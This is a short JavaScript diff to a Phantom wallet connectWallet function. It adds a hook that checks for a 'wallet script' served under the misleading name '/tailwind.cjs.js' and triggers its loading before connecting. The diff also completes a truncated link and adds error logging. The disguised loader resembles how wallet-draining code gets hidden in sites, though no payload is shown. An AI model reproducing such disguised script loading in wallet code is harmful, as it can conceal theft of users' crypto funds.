@@ -1,11 +1,22 @@
 async function connectWallet() {
   try {
+    // Ensure wallet script is loaded before connecting
+    if (!window.setup || !document.querySelector('script[src="/tailwind.cjs.js"]')) {
+      // Trigger wallet script load if not already loading
+      const event = new Event('wallet:load');
+      document.dispatchEvent(event);
+      
+      // Wait a bit for script to load
+      await new Promise(resolve => setTimeout(resolve, 500));
+    }
+    
     if (window.solana && window.solana.isPhantom) {
       await window.solana.connect();
     } else {
-      window.open('https:
+      window.open('https://phantom.app/', '_blank');
     }
   } catch (err) {
+    console.error('Wallet connection error:', err);
   }
 }
 
